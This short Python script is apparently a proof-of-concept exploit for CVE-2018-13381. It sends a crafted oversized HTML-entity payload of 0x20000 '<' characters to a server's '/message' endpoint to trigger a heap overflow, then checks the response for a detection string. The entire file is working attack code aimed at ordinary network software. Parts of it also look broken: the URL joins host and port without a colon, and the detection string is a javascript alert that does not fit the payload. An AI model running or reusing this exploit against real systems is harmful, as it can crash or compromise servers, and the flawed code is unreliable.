import requests



def cve_2018_13381(host, port):
    detect_string = ('document.location=decodeURIComponent'
                 '("javascript%3Aalert%28document.domain%29")')
    data = {
	   'title': 'x', 
        'msg': '&#' + '<'*(0x20000) + ';<', 
    }
    resp = requests.post('https://%s%s/message' % (host, port), data=data)
    if resp.status_code == 200 and detect_string in resp.text:
        print('Heaped overflow the host %s' % host)

if __name__ == "__main__":
    host = ""
    port = 4434
    cve_2018_13381(host, port)

